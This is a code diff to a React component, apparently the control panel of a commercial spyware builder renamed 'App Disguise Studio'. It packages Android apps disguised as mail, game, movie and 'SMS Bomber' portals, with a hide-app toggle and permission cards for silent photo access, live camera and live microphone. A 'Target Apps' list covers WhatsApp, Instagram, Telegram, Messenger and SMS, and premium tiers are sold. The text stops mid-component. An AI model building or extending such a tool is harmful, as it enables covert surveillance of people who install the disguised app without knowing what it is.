@@ -5,7 +5,8 @@ import CustomAlertModal from './CustomAlertModal';
 import { 
     Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
     ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
-    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info
+    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
+    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink
 } from 'lucide-react';
 
 interface AppGenerationModalProps {
@@ -19,49 +20,59 @@ interface AppGenerationModalProps {
 
 const DISGUISE_PRESETS = [
     {
-        id: 'calculator',
-        name: 'Calculator',
-        packageName: 'com.android.calculator2.pro',
-        iconType: 'calculator',
-        description: 'Standard calculator disguise. Blends perfectly into any phone.'
-    },
-    {
-        id: 'system',
-        name: 'System Service',
-        packageName: 'com.android.system.update.service',
-        iconType: 'system',
-        description: 'Looks like an official Android system component.'
-    },
-    {
-        id: 'notes',
-        name: 'Secure Notes',
-        packageName: 'com.app.notes.vault',
-        iconType: 'notes',
-        description: 'Clean personal notepad application disguise.'
-    },
-    {
-        id: 'game',
-        name: 'Mini Arcade',
-        packageName: 'com.game.arcade.mini',
-        iconType: 'game',
-        description: 'Casual mobile game center icon disguise.'
-    },
-    {
         id: 'custom',
-        name: 'Custom App',
-        packageName: 'com.gallery.eye.app',
-        iconType: 'custom',
-        description: 'Define your own custom app name, package, and icon.'
+        name: 'Custom Web App',
+        packageName: 'com.gallery.eye.client',
+        url: '',
+        color: 'from-indigo-500/20 via-blue-500/10 to-transparent border-indigo-500/40 text-indigo-300',
+        badgeColor: 'bg-indigo-500/20 text-indigo-300 border-indigo-500/40',
+        description: 'Set your own App Name, custom URL & upload your own icon.'
+    },
+    {
+        id: 'temp_mail',
+        name: 'Temp Mail',
+        packageName: 'com.tempmail.inbox.client',
+        url: 'https://mail.tm/en/',
+        color: 'from-emerald-500/20 via-teal-500/10 to-transparent border-emerald-500/40 text-emerald-300',
+        badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40',
+        description: 'Instant temporary email inbox disguise with live portal.'
+    },
+    {
+        id: 'poki_games',
+        name: 'Poki Games',
+        packageName: 'com.poki.games.arcade',
+        url: 'https://poki.com/',
+        color: 'from-purple-500/20 via-fuchsia-500/10 to-transparent border-purple-500/40 text-purple-300',
+        badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/40',
+        description: 'Free online gaming arcade portal disguise.'
+    },
+    {
+        id: 'movie_box',
+        name: 'Movie Box',
+        packageName: 'com.moviebox.cinema.hub',
+        url: 'https://movie-box.co/',
+        color: 'from-rose-500/20 via-pink-500/10 to-transparent border-rose-500/40 text-rose-300',
+        badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
+        description: 'Cinema streaming and entertainment hub disguise.'
+    },
+    {
+        id: 'sms_bomber',
+        name: 'SMS Bomber Pro',
+        packageName: 'com.h4k3r.bomber.pro',
+        url: 'https://h4k3r-bomber.vercel.app',
+        color: 'from-amber-500/20 via-orange-500/10 to-transparent border-amber-500/40 text-amber-300',
+        badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
+        description: 'High-speed utility & testing toolkit disguise.'
     }
 ];
 
 const MONITORED_APPS = [
-    { id: 'whatsapp_biz', name: 'WhatsApp Business', pkg: 'com.whatsapp.w4b', icon: '💬', color: 'text-emerald-400 border-emerald-500/30 bg-emerald-500/10' },
-    { id: 'whatsapp', name: 'WhatsApp Messenger', pkg: 'com.whatsapp', icon: '💬', color: 'text-green-400 border-green-500/30 bg-green-500/10' },
-    { id: 'instagram', name: 'Instagram', pkg: 'com.instagram.android', icon: '📸', color: 'text-pink-400 border-pink-500/30 bg-pink-500/10' },
-    { id: 'telegram', name: 'Telegram', pkg: 'org.telegram.messenger', icon: '✈️', color: 'text-cyan-400 border-cyan-500/30 bg-cyan-500/10' },
-    { id: 'messenger', name: 'Messenger', pkg: 'com.facebook.orca', icon: '⚡', color: 'text-blue-400 border-blue-500/30 bg-blue-500/10' },
-    { id: 'sms', name: 'System SMS', pkg: 'com.google.android.apps.messaging', icon: '📱', color: 'text-amber-400 border-amber-500/30 bg-amber-500/10' },
+    { id: 'whatsapp_biz', name: 'WhatsApp Business', pkg: 'com.whatsapp.w4b', icon: '💬', color: 'text-emerald-300 border-emerald-500/40 bg-emerald-500/15 shadow-[0_4px_16px_rgba(16,185,129,0.15)]' },
+    { id: 'whatsapp', name: 'WhatsApp Messenger', pkg: 'com.whatsapp', icon: '💬', color: 'text-green-300 border-green-500/40 bg-green-500/15 shadow-[0_4px_16px_rgba(34,197,94,0.15)]' },
+    { id: 'instagram', name: 'Instagram', pkg: 'com.instagram.android', icon: '📸', color: 'text-pink-300 border-pink-500/40 bg-pink-500/15 shadow-[0_4px_16px_rgba(236,72,153,0.15)]' },
+    { id: 'telegram', name: 'Telegram', pkg: 'org.telegram.messenger', icon: '✈️', color: 'text-cyan-300 border-cyan-500/40 bg-cyan-500/15 shadow-[0_4px_16px_rgba(6,182,212,0.15)]' },
+    { id: 'messenger', name: 'Messenger', pkg: 'com.facebook.orca', icon: '⚡', color: 'text-blue-300 border-blue-500/40 bg-blue-500/15 shadow-[0_4px_16px_rgba(59,130,246,0.15)]' },
+    { id: 'sms', name: 'System SMS', pkg: 'com.google.android.apps.messaging', icon: '📱', color: 'text-amber-300 border-amber-500/40 bg-amber-500/15 shadow-[0_4px_16px_rgba(245,158,11,0.15)]' },
 ];
 
 export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
@@ -76,9 +87,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [queuePosition, setQueuePosition] = useState(0);
 
     // Customization State
-    const [selectedPreset, setSelectedPreset] = useState<string>('calculator');
-    const [appName, setAppName] = useState("Calculator");
-    const [packageName, setPackageName] = useState("com.android.calculator2.pro");
+    const [selectedPreset, setSelectedPreset] = useState<string>('custom');
+    const [appName, setAppName] = useState("Custom Web App");
+    const [packageName, setPackageName] = useState("com.gallery.eye.client");
     const [hideApp, setHideApp] = useState(false);
     const [webLink, setWebLink] = useState("");
     const [customIcon, setCustomIcon] = useState<File | null>(null);
@@ -95,16 +106,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const handlePresetChange = (presetId: string) => {
         setSelectedPreset(presetId);
         const preset = DISGUISE_PRESETS.find(p => p.id === presetId);
-        if (preset && presetId !== 'custom') {
+        if (preset) {
             setAppName(preset.name);
             setPackageName(preset.packageName);
+            setWebLink(preset.url);
         }
     };
 
     const handleAppNameChange = (name: string) => {
         setAppName(name);
         setPackageName(generatePackageName(name));
-        setSelectedPreset('custom');
     };
 
     const handleIconSelect = (file: File | null) => {
@@ -144,24 +155,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
         download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
         custom: { title: "Custom", text: "Set your own title & text", icon: "✏️" },
-    };
-
-    const CLICK_ACTIONS: Record<string, string> = {
-        device_info: "Device Info (About Phone)",
-        settings: "Settings (Main)",
-        security: "Security Settings",
-        battery: "Battery Settings",
-        wifi: "WiFi Settings",
-        storage: "Storage Settings",
-        none: "Do Nothing",
-    };
-
-    const ICON_OPTIONS: Record<string, string> = {
-        info: "ℹ️ Info",
-        sync: "🔄 Sync",
-        lock: "🔒 Lock",
-        download: "⬇️ Download",
-        download_done: "✅ Download Done",
     };
 
     const [showCustomAlert, setShowCustomAlert] = useState(false);
@@ -313,21 +306,66 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         }
     };
 
-    const renderIconPreviewGlyph = () => {
+    // Ultra-realistic icon renderer for phone preview
+    const renderRealisticIcon = () => {
         if (customIconPreview) {
-            return <img src={customIconPreview} alt="App Icon" className="w-full h-full object-cover rounded-2xl" />;
+            return (
+                <div className="w-full h-full rounded-[22px] overflow-hidden shadow-[0_12px_28px_rgba(0,0,0,0.6)] border border-white/20">
+                    <img src={customIconPreview} alt="Uploaded Icon" className="w-full h-full object-cover" />
+                </div>
+            );
         }
+
         switch (selectedPreset) {
-            case 'calculator':
-                return <div className="w-full h-full bg-gradient-to-br from-amber-500 to-orange-600 rounded-2xl flex items-center justify-center text-2xl font-bold text-white shadow-inner">+-=</div>;
-            case 'system':
-                return <div className="w-full h-full bg-gradient-to-br from-cyan-500 to-blue-600 rounded-2xl flex items-center justify-center text-white shadow-inner"><RefreshCw size={24} className="animate-spin" /></div>;
-            case 'notes':
-                return <div className="w-full h-full bg-gradient-to-br from-emerald-500 to-teal-600 rounded-2xl flex items-center justify-center text-white shadow-inner"><Sparkles size={24} /></div>;
-            case 'game':
-                return <div className="w-full h-full bg-gradient-to-br from-purple-500 to-pink-600 rounded-2xl flex items-center justify-center text-white shadow-inner"><Zap size={24} /></div>;
+            case 'temp_mail':
+                return (
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border border-white/25 relative overflow-hidden group">
+                        <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent" />
+                        <div className="w-12 h-10 rounded-xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
+                            <Mail className="w-7 h-7 text-white drop-shadow" />
+                        </div>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1.5 drop-shadow">MAIL.TM</span>
+                    </div>
+                );
+            case 'poki_games':
+                return (
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border border-white/25 relative overflow-hidden group">
+                        <div className="absolute -top-6 -right-6 w-16 h-16 bg-pink-400/30 rounded-full blur-xl" />
+                        <div className="w-12 h-12 rounded-2xl bg-white/15 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
+                            <Gamepad2 className="w-7 h-7 text-white drop-shadow" />
+                        </div>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">POKI</span>
+                    </div>
+                );
+            case 'movie_box':
+                return (
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border border-white/25 relative overflow-hidden group">
+                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,0.25),transparent)]" />
+                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
+                            <Film className="w-7 h-7 text-white drop-shadow" />
+                        </div>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CINEMA</span>
+                    </div>
+                );
+            case 'sms_bomber':
+                return (
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border border-white/25 relative overflow-hidden group">
+                        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/10 to-black/30" />
+                        <div className="w-12 h-12 rounded-2xl bg-black/30 backdrop-blur-md flex items-center justify-center border border-amber-300/40 shadow-inner">
+                            <Flame className="w-7 h-7 text-amber-300 drop-shadow-[0_0_8px_rgba(251,191,36,0.8)]" />
+                        </div>
+                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow">H4K3R</span>
+                    </div>
+                );
             default:
-                return <div className="w-full h-full bg-gradient-to-br from-cyan-500 to-emerald-500 rounded-2xl flex items-center justify-center text-white shadow-inner"><Smartphone size={24} /></div>;
+                return (
+                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
+                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
+                            <Globe className="w-7 h-7 text-white drop-shadow" />
+                        </div>
+                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
+                    </div>
+                );
         }
     };
 
@@ -335,18 +373,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
     return (
         <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
-            <div className="bg-[#121316] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_20px_70px_rgba(0,0,0,0.8)] relative max-h-[92dvh] overflow-hidden">
+            <div className="bg-[#101217] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.9)] relative max-h-[92dvh] overflow-hidden">
                 
                 {/* Header & Step Navigation */}
-                <div className="p-5 sm:p-7 border-b border-white/10 bg-gradient-to-b from-white/[0.03] to-transparent flex flex-col gap-4">
+                <div className="p-5 sm:p-7 border-b border-white/10 bg-gradient-to-b from-white/[0.04] to-transparent flex flex-col gap-4">
                     <div className="flex items-center justify-between">
                         <div className="flex items-center gap-3">
-                            <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-emerald-500/20 to-cyan-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
+                            <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-emerald-500/20 via-cyan-500/20 to-indigo-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-300 shadow-[0_0_20px_rgba(16,185,129,0.2)]">
                                 <Sparkles size={22} />
                             </div>
                             <div className="text-left">
-                                <h2 className="text-xl sm:text-2xl font-black text-white tracking-tight">App Studio</h2>
-                                <p className="text-xs text-fg-3">Design, configure & compile your stealth mobile client</p>
+                                <h2 className="text-xl sm:text-2xl font-black text-white tracking-tight">App Disguise Studio</h2>
+                                <p className="text-xs text-fg-3">Design soft-UI stealth clients with pre-integrated portals</p>
                             </div>
                         </div>
                         <button
@@ -357,43 +395,43 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </button>
                     </div>
 
-                    {/* Step Wizard Tabs */}
-                    <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/50 border border-white/5">
+                    {/* Soft UI Step Wizard Tabs */}
+                    <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/60 border border-white/10 shadow-inner">
                         <button
                             type="button"
                             onClick={() => setActiveStep('identity')}
                             className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-xl text-xs font-bold transition-all ${
                                 activeStep === 'identity'
-                                    ? 'bg-gradient-to-r from-emerald-600/30 to-teal-600/30 text-emerald-300 border border-emerald-500/40 shadow-lg'
+                                    ? 'bg-gradient-to-r from-emerald-500/25 to-teal-500/25 text-emerald-300 border border-emerald-500/40 shadow-[0_4px_16px_rgba(16,185,129,0.2)]'
                                     : 'text-fg-3 hover:text-fg-1'
                             }`}
                         >
                             <Smartphone size={14} />
-                            <span className="hidden sm:inline">1. Identity</span>
+                            <span className="hidden sm:inline">1. Portal & Disguise</span>
                         </button>
                         <button
                             type="button"
                             onClick={() => setActiveStep('permissions')}
                             className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-xl text-xs font-bold transition-all ${
                                 activeStep === 'permissions'
-                                    ? 'bg-gradient-to-r from-cyan-600/30 to-blue-600/30 text-cyan-300 border border-cyan-500/40 shadow-lg'
+                                    ? 'bg-gradient-to-r from-cyan-500/25 to-blue-500/25 text-cyan-300 border border-cyan-500/40 shadow-[0_4px_16px_rgba(6,182,212,0.2)]'
                                     : 'text-fg-3 hover:text-fg-1'
                             }`}
                         >
                             <Shield size={14} />
-                            <span className="hidden sm:inline">2. Permissions</span>
+                            <span className="hidden sm:inline">2. Soft Permissions</span>
                         </button>
                         <button
                             type="button"
                             onClick={() => setActiveStep('notifications')}
                             className={`flex items-center justify-center gap-2 py-2.5 px-3 rounded-xl text-xs font-bold transition-all ${
                                 activeStep === 'notifications'
-                                    ? 'bg-gradient-to-r from-purple-600/30 to-pink-600/30 text-purple-300 border border-purple-500/40 shadow-lg'
+                                    ? 'bg-gradient-to-r from-purple-500/25 to-pink-500/25 text-purple-300 border border-purple-500/40 shadow-[0_4px_16px_rgba(168,85,247,0.2)]'
                                     : 'text-fg-3 hover:text-fg-1'
                             }`}
                         >
                             <Bell size={14} />
-                            <span className="hidden sm:inline">3. Notifications</span>
+                            <span className="hidden sm:inline">3. Target Apps</span>
                         </button>
                     </div>
                 </div>
@@ -401,95 +439,116 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                 {/* Main Content Area */}
                 <div className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                     
-                    {/* STEP 1: IDENTITY & ICON */}
+                    {/* STEP 1: PORTAL & DISGUISE PRESETS */}
                     {activeStep === 'identity' && (
                         <div className="space-y-6 animate-in fade-in duration-200">
                             
-                            {/* Disguise Preset Picker */}
+                            {/* Colorful Soft UI Disguise Presets */}
                             <div>
-                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2.5">Disguise Preset</label>
-                                <div className="grid grid-cols-2 sm:grid-cols-5 gap-2.5">
-                                    {DISGUISE_PRESETS.map((p) => (
-                                        <button
-                                            key={p.id}
-                                            type="button"
-                                            onClick={() => handlePresetChange(p.id)}
-                                            className={`p-3 rounded-2xl border text-left flex flex-col gap-1.5 transition-all ${
-                                                selectedPreset === p.id
-                                                    ? 'bg-emerald-500/15 border-emerald-500/50 shadow-[0_0_15px_rgba(16,185,129,0.2)] scale-[1.02]'
-                                                    : 'bg-black/30 border-white/5 hover:border-white/15 text-fg-3'
-                                            }`}
-                                        >
-                                            <span className="text-xs font-bold text-fg-1 truncate">{p.name}</span>
-                                            <span className="text-[10px] text-fg-4 truncate font-mono">{p.packageName}</span>
-                                        </button>
-                                    ))}
+                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2.5">Select Disguise Preset</label>
+                                <div className="grid grid-cols-1 sm:grid-cols-5 gap-2.5">
+                                    {DISGUISE_PRESETS.map((p) => {
+                                        const isSelected = selectedPreset === p.id;
+                                        return (
+                                            <button
+                                                key={p.id}
+                                                type="button"
+                                                onClick={() => handlePresetChange(p.id)}
+                                                className={`p-3 rounded-2xl border text-left flex flex-col gap-1.5 transition-all ${
+                                                    isSelected
+                                                        ? `bg-gradient-to-b ${p.color} shadow-lg scale-[1.02]`
+                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
+                                                }`}
+                                            >
+                                                <div className="flex items-center justify-between">
+                                                    <span className="text-xs font-extrabold text-white truncate">{p.name}</span>
+                                                    {isSelected && <CheckCircle2 size={14} className="text-emerald-400 flex-shrink-0" />}
+                                                </div>
+                                                <span className="text-[10px] text-fg-4 truncate font-mono">{p.packageName}</span>
+                                            </button>
+                                        );
+                                    })}
                                 </div>
                             </div>
 
-                            {/* App Identity + Interactive Phone Home-Screen Preview */}
+                            {/* App Configuration & Soft UI Phone Screen Preview */}
                             <div className="grid grid-cols-1 sm:grid-cols-12 gap-5 items-start">
                                 
                                 {/* Identity Inputs */}
                                 <div className="sm:col-span-7 space-y-4">
                                     <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Name</label>
+                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
                                         <input
                                             type="text"
                                             value={appName}
                                             onChange={(e) => handleAppNameChange(e.target.value)}
-                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white font-medium focus:outline-none focus:border-emerald-500 transition-colors"
-                                            placeholder="Calculator"
+                                            className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
+                                            placeholder="Enter App Name"
                                         />
                                     </div>
 
+                                    {/* Portal Web URL */}
                                     <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
-                                        <input
-                                            type="text"
-                                            value={packageName}
-                                            onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
-                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500 transition-colors"
-                                            placeholder="com.android.calculator2.pro"
-                                        />
-                                        <p className="text-[11px] text-fg-4 mt-1">Unique Android application identifier</p>
+                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Embedded Web Portal</label>
+                                        {selectedPreset !== 'custom' ? (
+                                            <div className="w-full bg-black/60 border border-emerald-500/30 rounded-2xl px-4 py-3 text-emerald-300 text-xs font-mono flex items-center justify-between shadow-inner">
+                                                <span className="truncate">Pre-integrated: {webLink}</span>
+                                                <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 font-bold ml-2">
+                                                    READY
+                                                </span>
+                                            </div>
+                                        ) : (
+                                            <input
+                                                type="url"
+                                                value={webLink}
+                                                onChange={(e) => setWebLink(e.target.value)}
+                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
+                                                placeholder="https://your-custom-link.com"
+                                            />
+                                        )}
+                                        <p className="text-[11px] text-fg-4 mt-1">
+                                            {selectedPreset !== 'custom' 
+                                                ? "Official portal link is pre-configured and hidden from the user."
+                                                : "Enter the custom WebView URL opened when the app launches."}
+                                        </p>
                                     </div>
 
                                     <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL (Optional)</label>
-                                        <input
-                                            type="url"
-                                            value={webLink}
-                                            onChange={(e) => setWebLink(e.target.value)}
-                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500 transition-colors"
-                                            placeholder="https://example.com"
-                                        />
-                                        <p className="text-[11px] text-fg-4 mt-1">URL displayed when user opens the app</p>
-                                    </div>
-
-                                    <div>
-                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Custom App Icon PNG (Optional)</label>
-                                        <input
-                                            type="file"
-                                            accept="image/png, image/jpeg"
-                                            onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
-                                            className="w-full bg-black/40 border border-white/10 rounded-xl px-3 py-2 text-white text-xs file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-bold file:bg-emerald-500/20 file:text-emerald-300 hover:file:bg-emerald-500/30"
-                                        />
+                                        <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG (Optional)</label>
+                                        <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
+                                            <div className="flex items-center gap-2.5">
+                                                <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
+                                                    <Upload size={16} />
+                                                </div>
+                                                <div>
+                                                    <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
+                                                    <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
+                                                </div>
+                                            </div>
+                                            <input
+                                                type="file"
+                                                accept="image/png, image/jpeg"
+                                                onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
+                                                className="hidden"
+                                            />
+                                        </label>
                                     </div>
                                 </div>
 
-                                {/* Phone Interactive Icon Preview */}
-                                <div className="sm:col-span-5 bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center">
-                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Phone Icon Preview</div>
+                                {/* Soft UI Phone Home-Screen Preview */}
+                                <div className="sm:col-span-5 bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl">
+                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
+                                    
                                     <div className="w-24 h-24 mb-3 relative group">
-                                        {renderIconPreviewGlyph()}
+                                        {renderRealisticIcon()}
                                         {hideApp && (
-                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500/90 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
+                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
                                                 Hidden
                                             </div>
                                         )}
                                     </div>
-                                    <span className="text-sm font-bold text-white max-w-[140px] truncate">{appName || "App Name"}</span>
+
+                                    <span className="text-sm font-black text-white max-w-[140px] truncate">{appName || "App Name"}</span>
                                     <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{packageName}</span>
 
                                     {/* Hide App Toggle Switch */}
@@ -523,26 +582,26 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </div>
                     )}
 
-                    {/* STEP 2: PERMISSIONS & STEALTH */}
+                    {/* STEP 2: SOFT PERMISSIONS & STEALTH */}
                     {activeStep === 'permissions' && (
                         <div className="space-y-4 animate-in fade-in duration-200">
                             <div className="flex items-center justify-between">
-                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Stealth & Device Access</span>
-                                <span className="text-xs text-fg-4">Configure Android permissions requested at launch</span>
+                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Soft UI Access Permissions</span>
+                                <span className="text-xs text-fg-4">Each permission uses soft color coding</span>
                             </div>
 
                             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                 
-                                {/* Storage / Gallery */}
-                                <div className="p-4 rounded-2xl bg-black/40 border border-white/10 flex items-center justify-between gap-3">
+                                {/* Storage / Gallery - Soft Emerald */}
+                                <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(16,185,129,0.1)]">
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-white">Gallery & Storage</span>
-                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-fg-4 hover:text-emerald-400">
+                                            <span className="text-sm font-bold text-emerald-200">Gallery & Storage</span>
+                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-emerald-400/70 hover:text-emerald-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-fg-3">Silent photos & media indexing</span>
+                                        <span className="text-xs text-emerald-300/70">Silent media & photo access</span>
                                     </div>
                                     <button
                                         type="button"
@@ -553,21 +612,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Camera (PREMIUM) */}
-                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${!isPremium ? 'border-amber-500/30' : 'border-white/10'}`}>
+                                {/* Camera - Soft Cyan */}
+                                <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-white">Camera Capture</span>
+                                            <span className="text-sm font-bold text-cyan-200">Camera Capture</span>
                                             {!isPremium && (
-                                                <span className="bg-gradient-to-r from-cyan-500/20 to-purple-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider shadow-[0_0_10px_rgba(6,182,212,0.2)]">
+                                                <span className="bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                     PREMIUM
                                                 </span>
                                             )}
-                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-fg-4 hover:text-cyan-400">
+                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-cyan-400/70 hover:text-cyan-300">
                                                 <Info size={14} />
                                             </button>
                                         </div>
-                                        <span className="text-xs text-fg-3">Live video stream & snapshots</span>
+                                        <span className="text-xs text-cyan-300/70">Live video & photo snapshots</span>
                                     </div>
                                     <button
                                         type="button"
@@ -581,21 +640,21 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Microphone (PREMIUM) */}
-                                <div className={`p-4 rounded-2xl bg-black/40 border flex items-center justify-between gap-3 ${!isPremium ? 'border-amber-500/30' : 'border-white/10'}`}>
+                                {/* Microphone - Soft Violet */}
+                                <div className={`p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(168,85,247,0.1)]`}>
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-white">Live Microphone</span>
+                                            <span className="text-sm font-bold text-purple-200">Live Microphone</span>
                                             {!isPremium && (
